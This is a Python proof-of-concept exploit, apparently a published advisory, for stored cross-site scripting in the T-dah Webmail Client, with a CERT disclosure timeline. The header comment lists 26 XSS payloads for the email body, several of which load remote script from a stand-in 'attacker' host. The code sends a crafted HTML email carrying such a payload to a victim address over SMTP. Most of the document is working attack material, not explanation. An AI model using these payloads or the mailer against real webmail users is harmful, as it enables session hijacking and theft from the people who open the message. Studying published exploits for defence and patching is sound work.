#!/usr/bin/python
 
'''
 
Author: loneferret of Offensive Security
Product: T-dah Webmail Client
Version: 3.2.0-2.3
Vendor Site: http://t-dahmail.sourceforge.net/index.php
Software Download: http://sourceforge.net/projects/t-dahmail/
Contact: http://t-dahmail.sourceforge.net/forum/
 
Timeline:
29 May 2012: Vulnerability reported to CERT
30 May 2012: Response received from CERT with disclosure date set to 20 Jul 2012
23 Jul 2012: Update from CERT: No response from vendor
08 Aug 2012: Public Disclosure
 
Installed On: Ubuntu Server LAMP 11.10
Client Test OS: Windows 7 Pro (x86) SP1
Browser Used: Internet Explorer 9
 
Injection Point: Body
Injection Payload(s):
1: <SCRIPT SRC=http://attacker/xss.js></SCRIPT>
2: <SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
3: ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}
4: <SCRIPT>alert('XSS')</SCRIPT>
5: exp/*<XSS STYLE='no\xss:noxss("*//*");
xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
6: <BODY ONLOAD=alert('XSS')>
7: <IFRAME SRC="javascript:alert('XSS');"></IFRAME>
8: <DIV STYLE="width: expression(alert('XSS'));">
9: <XSS STYLE="xss:expression(alert('XSS'))">
10: <IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
11: <META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
12: <META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
13: <!--[if gte IE 4]>
<SCRIPT>alert('XSS');</SCRIPT>
<![endif]--
14: <SCRIPT SRC="http://attacker/xss.jpg"></SCRIPT>
15: <SCRIPT/XSS SRC="http://attacker/xss.js"></SCRIPT>
16: </TITLE><SCRIPT>alert("XSS");</SCRIPT>
17: <SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://attacker/xss.js"></SCRIPT>
18: <SCRIPT a=">'>" SRC="http://attacker/xss.js"></SCRIPT>
19: <<SCRIPT>alert("XSS");//<</SCRIPT>
20: <IMG """><SCRIPT>alert("XSS")</SCRIPT>">
21: <SCRIPT>a=/XSS/
alert(a.source)</SCRIPT>
22: <SCRIPT a=`>` SRC="http://attacker/xss.js"></SCRIPT>
23: <SCRIPT a="blah" '' SRC="http://attacker/xss.js"></SCRIPT>
24: <SCRIPT "a='>'" SRC="http://attacker/xss.js"></SCRIPT>
25: <SCRIPT ="blah" SRC="http://attacker/xss.js"></SCRIPT>
26: <SCRIPT a=">" SRC="http://attacker/xss.js"></SCRIPT>
 
'''
 
 
import smtplib, urllib2
  
payload = """<SCRIPT/XSS SRC="http://attacker/xss.js"></SCRIPT>"""
  
def sendMail(dstemail, frmemail, smtpsrv, username, password):
        msg  = "From: hacker@offsec.local\n"
        msg += "To: victim@victim.local\n"
        msg += 'Date: Today\r\n'
        msg += "Subject: XSS\n"
        msg += "Content-type: text/html\n\n"
        msg += "XSS" + payload + "\r\n\r\n"
        server = smtplib.SMTP(smtpsrv)
        server.login(username,password)
        try:
                server.sendmail(frmemail, dstemail, msg)
        except Exception, e:
                print "[-] Failed to send email:"
                print "[*] " + str(e)
        server.quit()
  
username = "hacker@offsec.local"
password = "123456"
dstemail = "victim@victim.local"
frmemail = "hacker@offsec.local"
smtpsrv  = "172.16.84.171"
  
print "[*] Sending Email"
sendMail(dstemail, frmemail, smtpsrv, username, password)